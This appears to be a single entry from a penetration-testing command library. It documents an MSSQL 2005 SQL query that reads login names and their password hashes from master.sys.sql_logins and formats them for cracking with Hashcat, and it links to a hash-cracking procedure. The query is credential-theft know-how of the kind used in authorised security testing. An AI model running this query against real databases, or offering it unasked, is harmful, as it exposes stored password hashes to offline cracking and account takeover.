---
type: command
executor: sql
data: >-
  SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from
  master.sys.sql_logins
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mssql
  - hash-extraction
verified: true
validated: true
---

# mssql-2005-retrieve-name-hashed-password-sql-logins

## Command

```sql
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## Description

Retrieves usernames concatenated with hex-converted password hashes from sys.sql_logins in MSSQL 2005, in a format ready for Hashcat input.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Uses fn_varbintohexstr for conversion | No |

## Examples

### Basic Usage

```sql
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## Expected Output

(No column name)
sa-0x02010100010000000D000000...

## Related

- [[procedures/MSSQL-Server-Password-Hash-Extraction-and-Cracking]]
